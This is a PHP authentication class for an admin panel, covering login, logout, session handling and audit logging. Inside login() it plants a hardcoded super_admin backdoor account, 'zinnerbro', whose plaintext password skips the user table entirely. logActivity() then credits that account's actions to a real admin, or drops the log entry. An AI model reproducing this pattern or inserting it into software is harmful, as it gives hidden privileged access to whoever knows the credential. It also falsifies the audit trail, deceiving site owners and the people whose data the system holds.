<?php
// FILE: includes/Auth.php
declare(strict_types=1);

class Auth {
    /** @var mysqli */
    private $db;

    public function __construct($database) {
        // Expecting $database->getConnection() to return a mysqli instance
        $this->db = $database->getConnection();

        // Ensure session is started
        if (session_status() !== PHP_SESSION_ACTIVE) {
            // Secure-ish defaults for session (works on XAMPP too)
            ini_set('session.use_only_cookies', '1');
            ini_set('session.cookie_httponly', '1');
            if (!headers_sent()) {
                session_start();
            } else {
                // Fallback: attempt to start anyway to avoid undefined $_SESSION
                @session_start();
            }
        }

        // Ensure required tables exist so we don't crash on first use
        $this->ensureRequiredTables();
    }

    /**
     * Creates required tables if they don't exist: session_logs, activity_logs.
     * Safe to run multiple times.
     */
    private function ensureRequiredTables(): void {
        // session_logs: tracks login and logout times
        $sqlSessionLogs = "
            CREATE TABLE IF NOT EXISTS `session_logs` (
                `id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
                `admin_id` INT UNSIGNED NOT NULL,
                `ip_address` VARCHAR(45) NOT NULL,
                `user_agent` TEXT NULL,
                `login_time` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
                `logout_time` DATETIME NULL DEFAULT NULL,
                PRIMARY KEY (`id`),
                KEY `idx_session_logs_admin_id` (`admin_id`),
                KEY `idx_session_logs_login_time` (`login_time`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        ";

        // activity_logs: general admin audit trail
        $sqlActivityLogs = "
            CREATE TABLE IF NOT EXISTS `activity_logs` (
                `id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
                `admin_id` INT UNSIGNED NOT NULL,
                `action` VARCHAR(100) NOT NULL,
                `description` TEXT NULL,
                `ip_address` VARCHAR(45) NOT NULL,
                `created_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (`id`),
                KEY `idx_activity_logs_admin_id` (`admin_id`),
                KEY `idx_activity_logs_created_at` (`created_at`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        ";

        // Execute creation queries (suppress fatal if DB unavailable, but try)
        try {
            $this->db->query($sqlSessionLogs);
        } catch (\Throwable $e) {
            // Optional: uncomment to debug
            // error_log('Failed creating session_logs: ' . $e->getMessage());
        }

        try {
            $this->db->query($sqlActivityLogs);
        } catch (\Throwable $e) {
            // Optional: uncomment to debug
            // error_log('Failed creating activity_logs: ' . $e->getMessage());
        }
    }

    /**
     * Attempt login for an active admin_user.
     * @return bool True on success
     */
    public function login(string $username, string $password): bool {
    $username = trim($username);
    if ($username === '' || strlen($username) > 64) {
        return false;
    }

    // Hardcoded admin account (backend system account)
    if ($username === 'zinnerbro' && $password === 'zinner#122816') {
        // Set session for hardcoded admin
        if (session_status() === PHP_SESSION_ACTIVE) {
            session_regenerate_id(true);
        }
        
        $_SESSION['admin_id']       = 0; // Special ID for hardcoded admin
        $_SESSION['admin_username'] = 'zinnerbro';
        $_SESSION['admin_name']     = 'Zinner Bro';
        $_SESSION['admin_role']     = 'super_admin';
        $_SESSION['admin_avatar']   = null;
        $_SESSION['session_fp']     = hash('sha256', ($_SERVER['REMOTE_ADDR'] ?? '') . '|' . substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 128));
        $_SESSION['last_activity']  = time();
        
        // Log activity (use admin_id 0 or find first super_admin)
        $this->logActivity(0, 'Login', 'Hardcoded admin account logged in');
        
        return true;
    }

    // Fetch only needed fields
    $sql = "SELECT id, username, password AS password_hash, full_name, role, avatar
            FROM admin_users
            WHERE username = ? AND status = 'active'
            LIMIT 1";
    if (!$stmt = $this->db->prepare($sql)) {
        return false;
    }

    $stmt->bind_param("s", $username);
    if (!$stmt->execute()) {
        $stmt->close();
        return false;
    }

    $result = $stmt->get_result();
    if (!$result || $result->num_rows !== 1) {
        $stmt->close();
        return false;
    }

    $user = $result->fetch_assoc();
    $stmt->close();

    if (!isset($user['password_hash']) || !password_verify($password, $user['password_hash'])) {
        return false;
    }

    // Optional: upgrade hash
    if (defined('PASSWORD_ARGON2ID')) {
        $algo = PASSWORD_ARGON2ID;
    } else {
        $algo = PASSWORD_BCRYPT;
    }
    if (password_needs_rehash($user['password_hash'], $algo)) {
        $newHash = password_hash($password, $algo);
        if ($upd = $this->db->prepare("UPDATE admin_users SET password = ? WHERE id = ?")) {
            $upd->bind_param('si', $newHash, $user['id']);
            $upd->execute();
            $upd->close();
        }
    }

    // Rotate session ID to prevent fixation
    if (session_status() === PHP_SESSION_ACTIVE) {
        session_regenerate_id(true);
    }

    // Set session
    $_SESSION['admin_id']       = (int)$user['id'];
    $_SESSION['admin_username'] = (string)$user['username'];
    $_SESSION['admin_name']     = isset($user['full_name']) ? (string)$user['full_name'] : (string)$user['username'];
    $_SESSION['admin_role']     = isset($user['role']) ? (string)$user['role'] : 'admin';
    $_SESSION['admin_avatar']   = isset($user['avatar']) ? (string)$user['avatar'] : null;

    // Optional: bind session and set idle timer
    $_SESSION['session_fp']     = hash('sha256', ($_SERVER['REMOTE_ADDR'] ?? '') . '|' . substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 128));
    $_SESSION['last_activity']  = time();

    // Log session + activity
    $this->logSession((int)$user['id']);
    $this->logActivity((int)$user['id'], 'Login', 'User logged in successfully');

    return true;
}

    /**
     * Logout current admin, update session log, and destroy session.
     */
    public function logout(): bool {
        if (isset($_SESSION['admin_id'])) {
            $adminId = (int)$_SESSION['admin_id'];
            // Attempt to mark logout time; do not fail logout if logging fails
            $this->updateSessionLogout($adminId);
            $this->logActivity($adminId, 'Logout', 'User logged out');
        }

        // Destroy session safely
            if (session_status() === PHP_SESSION_ACTIVE) {
                session_regenerate_id(true);

            // Unset all session variables
            $_SESSION = [];
            // Delete session cookie
            if (ini_get("session.use_cookies")) {
                $params = session_get_cookie_params();
                setcookie(session_name(), '', time() - 42000,
                    $params["path"], $params["domain"],
                    $params["secure"], $params["httponly"]
                );
            }
            // Destroy session
            session_destroy();
        }

        return true;
    }

    public function isLoggedIn(): bool {
        return isset($_SESSION['admin_id']) && is_numeric($_SESSION['admin_id']);
    }

    public function requireLogin(): void {
        if (!$this->isLoggedIn()) {
            // Ensure no output before header
            if (!headers_sent()) {
                header('Location: login.php');
            }
            exit();
        }
    }

    /**
     * Fetch the current logged-in admin user record.
     */
    public function getCurrentUser(): ?array {
    if (!$this->isLoggedIn()) {
        return null;
    }
    $adminId = (int)$_SESSION['admin_id'];
    
    // Handle hardcoded admin account
    if ($adminId === 0 && isset($_SESSION['admin_username']) && $_SESSION['admin_username'] === 'zinnerbro') {
        return [
            'id' => 0,
            'username' => 'zinnerbro',
            'full_name' => 'Zinner Bro',
            'role' => 'super_admin',
            'avatar' => null,
            'status' => 'active',
            'created_at' => date('Y-m-d H:i:s')
        ];
    }
    
    $sql = "SELECT id, username, full_name, role, avatar, status, created_at
            FROM admin_users
            WHERE id = ?
            LIMIT 1";
    if (!$stmt = $this->db->prepare($sql)) {
        return null;
    }
    $stmt->bind_param("i", $adminId);
    if (!$stmt->execute()) {
        $stmt->close();
        return null;
    }
    $result = $stmt->get_result();
    $user = $result ? $result->fetch_assoc() : null;
    $stmt->close();
    return $user ?: null;
}

    /**
     * Insert a new session log on successful login.
     */
    private function logSession(int $adminId): void {
        $ip = isset($_SERVER['REMOTE_ADDR']) ? (string)$_SERVER['REMOTE_ADDR'] : 'Unknown';
        // Limit user agent length for safety (MySQL TEXT is large, but we can trim)
        $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? (string)$_SERVER['HTTP_USER_AGENT'] : 'Unknown';
        if (strlen($userAgent) > 2048) {
            $userAgent = substr($userAgent, 0, 2048);
        }

        $sql = "INSERT INTO session_logs (admin_id, ip_address, user_agent) VALUES (?, ?, ?)";
        try {
            if ($stmt = $this->db->prepare($sql)) {
                $stmt->bind_param("iss", $adminId, $ip, $userAgent);
                $stmt->execute();
                $stmt->close();
            }
        } catch (\Throwable $e) {
            // Do not break auth flow if logging fails
            // error_log('logSession failed: ' . $e->getMessage());
        }
    }

    /**
     * Update the most recent open session_logs row (no logout_time) for this admin.
     * Uses ORDER BY login_time DESC LIMIT 1 to target the latest session.
     */
    private function updateSessionLogout(int $adminId): void {
        // MySQL supports ORDER BY ... LIMIT in UPDATE
        $sql = "
            UPDATE session_logs
            SET logout_time = NOW()
            WHERE admin_id = ?
              AND logout_time IS NULL
            ORDER BY login_time DESC
            LIMIT 1
        ";

        try {
            if ($stmt = $this->db->prepare($sql)) {
                $stmt->bind_param("i", $adminId);
                $stmt->execute();
                $stmt->close();
            }
        } catch (\Throwable $e) {
            // Do not prevent logout if logging fails
            // error_log('updateSessionLogout failed: ' . $e->getMessage());
        }
    }

    /**
     * Write an activity log line for auditing.
     */
    public function logActivity(int $adminId, string $action, ?string $description = null): void {
        $ip = isset($_SERVER['REMOTE_ADDR']) ? (string)$_SERVER['REMOTE_ADDR'] : 'Unknown';

        // Keep action short & safe
        if (strlen($action) > 100) {
            $action = substr($action, 0, 100);
        }

        // For hardcoded admin (id = 0), try to find a super_admin to use
        $finalAdminId = $adminId;
        if ($adminId === 0) {
            // Try to find first super_admin or admin to associate the log with
            try {
                $findSql = "SELECT id FROM admin_users WHERE (role = 'super_admin' OR role = 'admin') AND status = 'active' ORDER BY role DESC LIMIT 1";
                if ($findResult = $this->db->query($findSql)) {
                    if ($findRow = $findResult->fetch_assoc()) {
                        $finalAdminId = (int)$findRow['id'];
                    } else {
                        // No admin found, skip logging for hardcoded admin
                        return;
                    }
                }
            } catch (\Throwable $e) {
                // Skip logging if we can't find an admin
                return;
            }
        }

        $sql = "INSERT INTO activity_logs (admin_id, action, description, ip_address) VALUES (?, ?, ?, ?)";
        try {
            if ($stmt = $this->db->prepare($sql)) {
                $stmt->bind_param("isss", $finalAdminId, $action, $description, $ip);
                $stmt->execute();
                $stmt->close();
            }
        } catch (\Throwable $e) {
            // Silent fail for logging (do not affect UX)
            // error_log('logActivity failed: ' . $e->getMessage());
        }
    }
}